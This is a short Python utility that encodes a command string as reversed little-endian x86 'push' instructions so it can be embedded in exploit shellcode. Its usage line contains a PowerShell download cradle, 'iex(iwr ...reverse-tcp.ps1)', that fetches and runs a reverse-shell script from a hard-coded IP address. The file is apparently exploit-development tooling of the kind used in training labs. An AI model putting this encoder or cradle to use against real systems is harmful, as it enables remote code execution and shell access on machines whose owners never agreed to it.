#!/usr/bin/env python3
from __future__ import annotations
from struct import pack, unpack
from binascii import hexlify
from sys import argv


def encode(command: list[str]) -> str:
    """ Encode string array into x86 push instructions
    :param command: String array representing the powershell cradle
    :return: String of push instructions
    """
    data: bytes = " ".join(command).encode()
    data: bytes = data.ljust(len(data) + (4 - (len(data) % 4)), b" ")
    buffer: list = [data[i:i+4] for i in range(0, len(data), 4)]
    buffer.reverse()
    return "\n".join([f"push 0x{hexlify(pack('<I', unpack('>I', byte)[0])).decode()}" for byte in buffer])


if __name__ == '__main__':
    # Python creation of little-endian PowerShell execution cradle
    print(
        encode(argv[1:]) if len(argv) > 1 else
        f"Usage: python3 {argv[0]} 'powershell.exe -c iex(iwr http://172.31.24.110/reverse-tcp.ps1)'"
    )
